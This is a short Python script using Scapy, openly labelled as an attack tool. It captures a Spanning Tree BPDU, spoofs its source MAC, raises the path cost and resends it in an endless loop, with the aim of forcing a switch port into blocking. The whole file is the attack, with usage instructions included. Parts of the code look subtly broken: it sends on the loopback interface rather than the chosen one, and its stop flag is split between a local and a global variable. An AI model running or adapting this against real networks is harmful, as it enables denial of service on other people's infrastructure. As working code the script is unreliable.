#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Program: STP-AP-ATTACK
# Author: Github: netstalk33r (https://github.com/netstalk33r)
# Description: This script attempts to make the switch port behind an access point or unmanaged switch go blocking


# Global variables
VERSION = "0.01"
INTERFACE = ""


def main():
    # Import the necessary modules from Scapy
    from scapy.all import sniff, STP, get_if_hwaddr
    import argparse

    # Declare the global variables
    global INTERFACE

    # Store the value of the specified interface in the INTERFACE variable
    INTERFACE = parseargs().interface

    # Define a variable to track whether an STP BPDU has been received
    STP_BPDU_received = False

    # Use the sniff() function to capture packets on the specified interface
    sniff(
        iface=INTERFACE, prn=STP_BPDU_handler, stop_filter=lambda x: STP_BPDU_received
    )

    return


# Define a callback function for the sniff() function
def STP_BPDU_handler(pkt):
    # Import the time and sendp() functions from the Scapy module
    from time import sleep
    from scapy.all import sendp, STP, get_if_hwaddr

    # Declare the global variables
    global STP_BPDU_received
    global INTERFACE

    # Check if the packet is an STP BPDU
    if pkt.haslayer(STP):
        # Print the source and destination MAC addresses of the BPDU
        print(
            "Received: STP BPDU SRC:{} DST:{} cost:{} root:{}".format(
                pkt.src, pkt.dst, pkt.pathcost, pkt.rootmac
            )
        )

        # Set the STP_BPDU_received variable to True to stop sniffing
        STP_BPDU_received = True

        # Set the source MAC address of the BPDU to the MAC address of the specified interface
        pkt.src = get_if_hwaddr(INTERFACE)

        # Increase the path cost of the BPDU
        pkt.pathcost = pkt.pathcost + 100

        # Send the original BPDU on the same interface
        while True:
            # Sleep for 1 second
            sleep(1)

            # Print a message indicating that the BPDU is being sent
            print(
                "Sending: STP BPDU SRC:{} DST:{} cost:{} root:{}".format(
                    pkt.src, pkt.dst, pkt.pathcost, pkt.rootmac
                )
            )

            # Send the BPDU using the sendp() function
            sendp(pkt, iface="lo", verbose=False)

    return


def parseargs():
    # Import the argparse module
    import argparse

    # Parse the command-line arguments
    parser = argparse.ArgumentParser(
        description="STP-AP-ATTACK: This script attempts to make the switch port behind an access point or unmanaged switch go blocking.",
        epilog="Example usage: python3 stp-ap-attack.py -i eth0",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )

    # Add the '-i' or '--interface' argument to specify the interface to sniff on
    parser.add_argument(
        "-i", "--interface", required=True, help="The interface to sniff on"
    )

    # Parse the arguments and store them in the 'args' variable
    args = parser.parse_args()

    # Return the 'args' variable
    return args


if __name__ == "__main__":
    main()
